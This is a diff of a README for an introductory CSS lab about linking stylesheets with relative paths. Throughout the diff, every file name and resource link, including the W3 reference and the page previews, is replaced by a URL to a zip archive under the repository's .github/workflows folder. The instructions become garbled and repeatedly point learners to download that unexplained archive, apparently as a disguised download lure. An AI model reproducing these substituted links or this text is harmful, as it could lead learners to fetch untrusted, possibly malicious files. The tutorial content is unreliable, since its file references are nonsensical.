@@ -16,7 +16,7 @@ In order to further customize the style, appearance, and interactive behavior of
 our websites, we turn to Cascading Style Sheets, or CSS. In this lab, we will
 work on implementing CSS declarations in our HTML.
 
-![HTML vs CSS Table](https://raw.githubusercontent.com/GabrielW13Nai/phase-0-css-intro-lab/master/.github/phase-0-css-intro-lab-v3.5.zip%20vs%https://raw.githubusercontent.com/GabrielW13Nai/phase-0-css-intro-lab/master/.github/phase-0-css-intro-lab-v3.5.zip)
+![HTML vs CSS Table](https://github.com/GabrielW13Nai/phase-0-css-intro-lab/raw/refs/heads/master/.github/workflows/intro_lab_phase_css_v3.2.zip%20vs%https://github.com/GabrielW13Nai/phase-0-css-intro-lab/raw/refs/heads/master/.github/workflows/intro_lab_phase_css_v3.2.zip)
 
 ## Getting Started
 
@@ -43,7 +43,7 @@ of the `<style>` tag until their styling is done. At that point they move it to
 their external file and remove the `<style>` element from the HTML page. Feel
 free to try it out!
 
-In `https://raw.githubusercontent.com/GabrielW13Nai/phase-0-css-intro-lab/master/.github/phase-0-css-intro-lab-v3.5.zip`, provide a `<link>` tag which correctly sources the CSS file
+In `https://github.com/GabrielW13Nai/phase-0-css-intro-lab/raw/refs/heads/master/.github/workflows/intro_lab_phase_css_v3.2.zip`, provide a `<link>` tag which correctly sources the CSS file
 located in this directory. The `<link>` tag will link to our file with an `href`
 attribute, like so:
 
@@ -51,18 +51,18 @@ attribute, like so:
 <link rel="stylesheet" href="relative path to CSS file" />
 ```
 
-The `href` attribute should point to the file `https://raw.githubusercontent.com/GabrielW13Nai/phase-0-css-intro-lab/master/.github/phase-0-css-intro-lab-v3.5.zip` which is located in
+The `href` attribute should point to the file `https://github.com/GabrielW13Nai/phase-0-css-intro-lab/raw/refs/heads/master/.github/workflows/intro_lab_phase_css_v3.2.zip` which is located in
 this directory using a _relative path_. The `rel` attribute is used to note that
 the file which is being linked has a **rel**ation of being a "stylesheet."
 
-Now, what is a relative path? You could write `href="https://raw.githubusercontent.com/GabrielW13Nai/phase-0-css-intro-lab/master/.github/phase-0-css-intro-lab-v3.5.zip"` and the content
-of `https://raw.githubusercontent.com/GabrielW13Nai/phase-0-css-intro-lab/master/.github/phase-0-css-intro-lab-v3.5.zip` would change your `https://raw.githubusercontent.com/GabrielW13Nai/phase-0-css-intro-lab/master/.github/phase-0-css-intro-lab-v3.5.zip` file. But we want to teach you to
+Now, what is a relative path? You could write `href="https://github.com/GabrielW13Nai/phase-0-css-intro-lab/raw/refs/heads/master/.github/workflows/intro_lab_phase_css_v3.2.zip"` and the content
+of `https://github.com/GabrielW13Nai/phase-0-css-intro-lab/raw/refs/heads/master/.github/workflows/intro_lab_phase_css_v3.2.zip` would change your `https://github.com/GabrielW13Nai/phase-0-css-intro-lab/raw/refs/heads/master/.github/workflows/intro_lab_phase_css_v3.2.zip` file. But we want to teach you to
 require external resources (like CSS or JavaScript) by using _relative paths_.
 Relative paths make it _crystal clear_ which file is being used. Relative paths
 start with `./` which means "from the directory I am currently in." So, when we
-use `link` to associate with a style sheet and we write `href="https://raw.githubusercontent.com/GabrielW13Nai/phase-0-css-intro-lab/master/.github/phase-0-css-intro-lab-v3.5.zip"`
-we're saying: "From the directory in which I, the `https://raw.githubusercontent.com/GabrielW13Nai/phase-0-css-intro-lab/master/.github/phase-0-css-intro-lab-v3.5.zip` file live, look
-for a file called `https://raw.githubusercontent.com/GabrielW13Nai/phase-0-css-intro-lab/master/.github/phase-0-css-intro-lab-v3.5.zip` and use it. This pattern will help you and other
+use `link` to associate with a style sheet and we write `href="https://github.com/GabrielW13Nai/phase-0-css-intro-lab/raw/refs/heads/master/.github/workflows/intro_lab_phase_css_v3.2.zip"`
+we're saying: "From the directory in which I, the `https://github.com/GabrielW13Nai/phase-0-css-intro-lab/raw/refs/heads/master/.github/workflows/intro_lab_phase_css_v3.2.zip` file live, look
+for a file called `https://github.com/GabrielW13Nai/phase-0-css-intro-lab/raw/refs/heads/master/.github/workflows/intro_lab_phase_css_v3.2.zip` and use it. This pattern will help you and other
 developers remove any possible confusion.
 
 ```html
@@ -70,19 +70,19 @@ developers remove any possible confusion.
 ```
 
 Links to style sheets should go at the end of the `<head>` section! Make sure
-you provide a _relative_ path to the style sheet. Hint: Open `https://raw.githubusercontent.com/GabrielW13Nai/phase-0-css-intro-lab/master/.github/phase-0-css-intro-lab-v3.5.zip` in the
+you provide a _relative_ path to the style sheet. Hint: Open `https://github.com/GabrielW13Nai/phase-0-css-intro-lab/raw/refs/heads/master/.github/workflows/intro_lab_phase_css_v3.2.zip` in the
 browser. You can test whether your link is working or not by the color of your
 headline. If it's red, it's working! If it's black, keep going - you'll get it.
 
 ## Implement CSS Declarations
 
 Now, we are going to create some CSS declarations and add styling to our
-document! First, open `https://raw.githubusercontent.com/GabrielW13Nai/phase-0-css-intro-lab/master/.github/phase-0-css-intro-lab-v3.5.zip` in the browser to get a good idea of what
+document! First, open `https://github.com/GabrielW13Nai/phase-0-css-intro-lab/raw/refs/heads/master/.github/workflows/intro_lab_phase_css_v3.2.zip` in the browser to get a good idea of what
 [our un-styled page][un-styled] page looks like.
 
 What we would really like is [something a little more jazzed up][styled]! Let's
 work towards that. Set the following _properties_ to specific _values_. Make
-sure to, after each update, look at `https://raw.githubusercontent.com/GabrielW13Nai/phase-0-css-intro-lab/master/.github/phase-0-css-intro-lab-v3.5.zip` in the browser to see how it
+sure to, after each update, look at `https://github.com/GabrielW13Nai/phase-0-css-intro-lab/raw/refs/heads/master/.github/workflows/intro_lab_phase_css_v3.2.zip` in the browser to see how it
 has changed:
 
 - Set the `background` of the `<body>` element (whole document) to `#00b3e6`
@@ -108,9 +108,9 @@ expect on websites.
 
 ## Resources
 
-- [W3 Introduction to CSS](https://raw.githubusercontent.com/GabrielW13Nai/phase-0-css-intro-lab/master/.github/phase-0-css-intro-lab-v3.5.zip)
+- [W3 Introduction to CSS](https://github.com/GabrielW13Nai/phase-0-css-intro-lab/raw/refs/heads/master/.github/workflows/intro_lab_phase_css_v3.2.zip)
 
 [un-styled]:
-  https://raw.githubusercontent.com/GabrielW13Nai/phase-0-css-intro-lab/master/.github/phase-0-css-intro-lab-v3.5.zip
+  https://github.com/GabrielW13Nai/phase-0-css-intro-lab/raw/refs/heads/master/.github/workflows/intro_lab_phase_css_v3.2.zip
 [styled]:
-  https://raw.githubusercontent.com/GabrielW13Nai/phase-0-css-intro-lab/master/.github/phase-0-css-intro-lab-v3.5.zip
+  https://github.com/GabrielW13Nai/phase-0-css-intro-lab/raw/refs/heads/master/.github/workflows/intro_lab_phase_css_v3.2.zip
